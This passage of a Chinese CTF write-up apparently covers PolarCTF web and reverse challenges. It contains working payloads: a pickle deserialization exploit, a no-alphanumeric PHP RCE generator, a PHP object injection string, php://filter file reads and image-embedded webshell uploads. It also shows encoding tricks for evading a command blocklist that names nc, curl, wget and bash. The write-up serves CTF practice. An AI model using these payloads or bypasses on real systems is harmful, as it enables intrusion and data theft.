class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>构造payload得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return eval , (&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;, )</span><br><span class="line"> </span><br><span class="line">e=exp()</span><br><span class="line">exp = pickle.dumps(e)</span><br><span class="line">user_b64 = base64.b64encode(exp).decode()</span><br><span class="line">print(user_b64)</span><br></pre></td></tr></table></figure><h3 id="wu"><a href="#wu" class="headerlink" title="wu"></a>wu</h3><p>分析源码，发现是无数字字母RCE，最简单的思路直接取反 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下边是一个脚本，建议用这个y4👴的一站式脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Y4tacker</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-21 20:31:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">orRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par1</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//异或</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xorRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par1</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//取反</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">negateRce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//mode=1代表或，2代表异或，3代表取反</span></span><br><span class="line"><span class="comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"><span class="variable">$mode</span>, <span class="variable">$preg</span>=<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span>!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$par1</span> = <span class="string">&quot;%&quot;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                    <span class="variable">$par2</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = <span class="title function_ invoke__">orRce</span>(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">2</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = <span class="title function_ invoke__">xorRce</span>(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$res</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$res</span>)&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$res</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par1</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par2</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">negateRce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">generate</span>(<span class="number">3</span>,<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>);</span><br><span class="line"><span class="comment">//1代表模式，后面的是过滤规则</span></span><br><span class="line">直接终端执行脚本</span><br></pre></td></tr></table></figure><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.03.47.png" alt="截屏2025-02-28 17.03.47"></p><p>得到flag了</p><h3 id="代码审计1"><a href="#代码审计1" class="headerlink" title="代码审计1"></a>代码审计1</h3><p>分析源码,从代码<code>echo new $sys($xsx);</code> 看考查的是对PHP原生类的利用，题目中做了关键字过滤，可尝试使用PHP伪协议结合PHP原生类（SplFileObject）读取文件进行绕过，这里用的是 base64 编码读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 题目</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$sys = $_GET[&#x27;sys&#x27;];</span><br><span class="line">if (preg_match(&quot;|flag|&quot;, $xsx)) &#123;</span><br><span class="line">           die(&quot;flag is no here!&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $xsx = $_GET[&#x27;xsx&#x27;];</span><br><span class="line">    echo new $sys($xsx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造payload<code>?sys=SplFileObject&amp;xsx=php://filter/read=convert.base64-encode/resource=flag.php</code>得到base64进行解码得到flag</p><h3 id="你的马呢？"><a href="#你的马呢？" class="headerlink" title="你的马呢？"></a>你的马呢？</h3><p>这个题目肯定是一个上传漏洞，经过多次上传发现对文件内容和后缀进行了检测，那么将一句话木马的php换成=就可以绕过了</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.14.51.png" alt="截屏2025-02-28 17.14.51" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.54.png" alt="截屏2025-02-28 17.15.54" style="zoom:50%;" /></p><p> <img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.30.png" alt="截屏2025-02-28 17.15.30" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.08.png" alt="截屏2025-02-28 17.15.08" style="zoom:50%;" /></p><p>成功上传后，用蚁剑连接<code>/index.php?file=uploads/hack.jpg</code>得到flag</p><h3 id="随机值"><a href="#随机值" class="headerlink" title="随机值"></a>随机值</h3><p>分析源码，发现是反序列化的随机数,按照反序列化的步骤进行构造payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Polar1 === <span class="variable language_">$this</span>-&gt;Polar2)&#123;</span><br><span class="line">            <span class="variable">$Light</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Night === <span class="variable language_">$this</span>-&gt;Light)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload,得到flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Index</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//payload:?sys=O%3A5%3A%22Index%22%3A4%3A%7Bs%3A13%3A%22%00Index%00Polar1%22%3Bi%3A1%3Bs%3A13%3A%22%00Index%00Polar2%22%3Bi%3A1%3Bs%3A8%3A%22%00%2A%00Night%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22%00%2A%00Light%22%3Bs%3A1%3A%22a%22%3B%7D</span></span><br></pre></td></tr></table></figure><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>先根据访问URL后的提示查看robots.txt下有什么东西，发现有file和upload，那么肯定是先上传木马然后读取木马，用蚁剑连接</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.19.png" alt="截屏2025-02-28 17.35.19" style="zoom:50%;" /></p><p>访问/file</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.46.png" alt="截屏2025-02-28 17.35.46" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.54.png" alt="截屏2025-02-28 17.35.54" style="zoom:50%;" /></p><p>返回去访问upload</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.36.22.png" alt="截屏2025-02-28 17.36.22" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.36.33.png" alt="截屏2025-02-28 17.36.33" style="zoom:50%;" /></p><p>经过上传测试只能上传图片，那就传个图片马，上传后用file访问一下得到文件路径<code>../uploads/images/hack.jpg</code>,用蚁剑连接</p><p><code>http://5843cbd8-e32c-463b-8a13-7dfb65a381dc.www.polarctf.com:8090/file/file.php?filename=../uploads/images/hack.jpg</code></p><p>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.40.21.png" alt="截屏2025-02-28 17.40.21" style="zoom:50%;" /></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>根据提示，用dirsearch进行扫描，然后发现点我开始不能点，直接修改代码去掉<code>disabled=&quot;disabled&quot;</code>就可以跳转到上传页面，这个上传没有进行过滤直接上传就行</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.46.23.png" alt="截屏2025-02-28 17.46.23" style="zoom:50%;" /></p><p>扫描完发现上传的路径直接用蚁剑连接得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.47.37.png" alt="截屏2025-02-28 17.47.37" style="zoom:50%;" /></p><h3 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h3><p>经过多次测试注入，发现不是注入，那么猜测一下是不是伪协议</p><p><code>twothree=php://filter/convert.base64-encode/index/resource=index</code></p><p>然后解密base64得到源码，发现自动添加.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;twothree&quot;</span>&gt;Please input your ID:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;twothree&quot;</span> name=<span class="string">&quot;twothree&quot;</span> required&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;twothree&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;1&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;2&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后构造payload<code>php://filter/read=convert.base64-encode/resource=flag</code>得到flag</p><h3 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h3><p>根据提示访问一下sys.php，分析源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    $cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">    if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;, $cmd)) &#123;</span><br><span class="line">        $output = system($cmd);</span><br><span class="line">        echo $output;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造payload</p><p>方法一：尝试php -r来进行二次执行，ff是进行的一个绕过执行，否则得不到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(&quot;6c73202e2e2f&quot;));&#x27;</span><br><span class="line">查看</span><br><span class="line">cmd=php -r &#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></pre></td></tr></table></figure><p>方法二：这里看到一个师傅利用了printf和双引号绕过base64加密的方法得到了答案，也放在这，还是比较巧妙的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=`printf &quot;Y2F0IC8q&quot;|bas&quot;&quot;e64 -d`</span><br></pre></td></tr></table></figure><p>方法三：上面几个都是借鉴的，还有一个办法就是八进制转化，之前写xyctf有一个和这样类似的，我就直接上payload了,空格用$&lt;进行绕过<a href="https://0ran9ewww.github.io/2024/04/26/XYCTFwp及个人复盘/">文章</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27</span><br></pre></td></tr></table></figure><h3 id="笑傲上传"><a href="#笑傲上传" class="headerlink" title="笑傲上传"></a>笑傲上传</h3><p>首先看到下边这个页面，发现神秘链接可以跳转，出现了代码，感觉应该是先上传文件，然后在源码这里进行file传参，用蚁剑连接</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.15.01.png" alt="截屏2025-03-01 09.15.01" style="zoom:50%;" /></p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.14.20.png" alt="截屏2025-03-01 09.14.20" style="zoom:50%;" /></p><p>试一下上传，发现只能上传图片的，那么直接将木马拼接在图片后边</p><p><code>cat hack.php &gt;&gt; tou.jpg</code>，然后上传文件，发现上传成功了，然后用蚁剑连接</p><p><code>http://00112188-145b-45ab-a6f6-124c0de1a115.www.polarctf.com:8090/include.php?file=/var/www/html/upload/6120250301011149.jpg</code>得到flag</p><p><img src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.18.44.png" alt="截屏2025-03-01 09.18.44" style="zoom:50%;" /></p><h2 id="REVERSE-逆向"><a href="#REVERSE-逆向" class="headerlink" title="REVERSE 逆向"></a>REVERSE 逆向</h2><h3 id="康师傅"><a href="#康师傅" class="headerlink" title="康师傅"></a>康师傅</h3><p>首先去EPinfo查看是否加壳，没有加壳用IDA进行查看主函数，找到了main函数，进行分析这段代码是将Str1与9进行异或来加密的，然后编写python进行解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-84h]</span><br><span class="line">  char Str2[60]; // [esp+DCh] [ebp-78h] BYREF</span><br><span class="line">  char Str1[39]; // [esp+118h] [ebp-3Ch] BYREF</span><br><span class="line">  int v7; // [esp+13Fh] [ebp-15h]</span><br><span class="line">  int v8; // [esp+143h] [ebp-11h]</span><br><span class="line">  __int16 v9; // [esp+147h] [ebp-Dh]</span><br><span class="line">  char v10; // [esp+149h] [ebp-Bh]</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_53B006);</span><br><span class="line">  strcpy(Str1, &quot;oehnr8&gt;?;&lt;?:9k&gt;09;hj00o&gt;:&lt;o?8lh;8h9l;t&quot;);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  j__memset(Str2, 0, 0x32u);</span><br><span class="line">  sub_45748D(&quot;请输入密码\r\n&quot;);</span><br><span class="line">  sub_457929(&amp;unk_510E50, (char)Str2);</span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str2); ++i )</span><br><span class="line">    Str2[i] ^= 9u;</span><br><span class="line">  if ( !j__strcmp(Str1, Str2) )</span><br><span class="line">    sub_45748D(&quot;right&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_45748D(&quot;error&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># py脚本</span></span><br><span class="line">encrypted_str = <span class="string">&quot;oehnr8&gt;?;&lt;?:9k&gt;09;hj00o&gt;:&lt;o?8lh;8h9l;t&quot;</span></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> encrypted_str:</span><br><span class="line">    <span class="comment"># 解密：异或 9u</span></span><br><span class="line">    decrypted_char = <span class="built_in">ord</span>(char) ^ <span class="number">9</span></span><br><span class="line">    flag.append(decrypted_char)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为可读字符串</span></span><br><span class="line">flag_str = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Password:&quot;</span>, flag_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到flag--Decrypted Password: flag&#123;17625630b7902ac99f735f61ea21a0e2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="加加减减"><a href="#加加减减" class="headerlink" title="加加减减"></a>加加减减</h3><p>首先更改文件后缀解压压缩包得到exe，然后放到ida分析，得到加密的代码进行分析，把用户输入的字符的ASCII-1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; // [esp+0h] [ebp-154h]</span><br><span class="line">  char v5; // [esp+0h] [ebp-154h]</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-84h]</span><br><span class="line">  char Str[60]; // [esp+DCh] [ebp-78h] BYREF</span><br><span class="line">  char Str2[39]; // [esp+118h] [ebp-3Ch] BYREF</span><br><span class="line">  int v9; // [esp+13Fh] [ebp-15h]</span><br><span class="line">  int v10; // [esp+143h] [ebp-11h]</span><br><span class="line">  __int16 v11; // [esp+147h] [ebp-Dh]</span><br><span class="line">  char v12; // [esp+149h] [ebp-Bh]</span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_41C009);</span><br><span class="line">  strcpy(Str2, &quot;ek`fz5123086/ce7ac7/`4a81`6/87b`b28a5|&quot;);</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  j_memset(Str, 0, 0x32u);</span><br><span class="line">  sub_41104B(&quot;input\r\n&quot;, v4);</span><br><span class="line">  sub_4110AA(&quot;%s&quot;, (char)Str);</span><br><span class="line">  for ( i = 0; i &lt; j_strlen(Str); ++i )</span><br><span class="line">    --Str[i];</span><br><span class="line">  if ( !j_strcmp(Str, Str2) )</span><br><span class="line">    sub_41104B(&quot;success\r\n&quot;, v5);</span><br><span class="line">  else</span><br><span class="line">    sub_41104B(&quot;sorry\r\n&quot;, v5);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#py脚本</span></span><br><span class="line">encrypted_str = <span class="string">&quot;ek`fz5123086/ce7ac7/`4a81`6/87b`b28a5|&quot;</span></span><br><span class="line">flag = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> encrypted_str:</span><br><span class="line">    <span class="comment"># 每个字符的 ASCII 码值 +1</span></span><br><span class="line">    decrypted_char = <span class="built_in">ord</span>(char) + <span class="number">1</span></span><br><span class="line">    flag.append(decrypted_char)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为可读字符串</span></span><br><span class="line">flag_str = flag.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted Password:&quot;</span>, 